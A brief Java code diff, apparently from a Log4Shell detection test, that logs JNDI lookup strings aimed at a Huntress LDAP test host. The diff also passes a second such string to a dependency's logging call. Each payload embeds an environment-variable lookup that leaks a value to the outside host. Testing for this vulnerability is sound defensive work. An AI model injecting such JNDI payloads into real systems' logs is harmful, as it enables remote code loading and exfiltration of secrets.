@@ -12,6 +12,6 @@ public class App {
     public static void main(String[] args ) {
         Configurator.setAllLevels(logger.getName(), Level.ALL);
         logger.error("${jndi:ldap://log4shell.huntress.com:1389/appName=${env:appName}/da4b0d7c-ddf4-4430-930b-3df93660840d}");
-        DependencyApp.runTheLog();
+        DependencyApp.runTheLog("${jndi:ldap://log4shell.huntress.com:1389/dependency=${env:dependencyName}/da4b0d7c-ddf4-4430-930b-3df93660840d}");
     }
 }
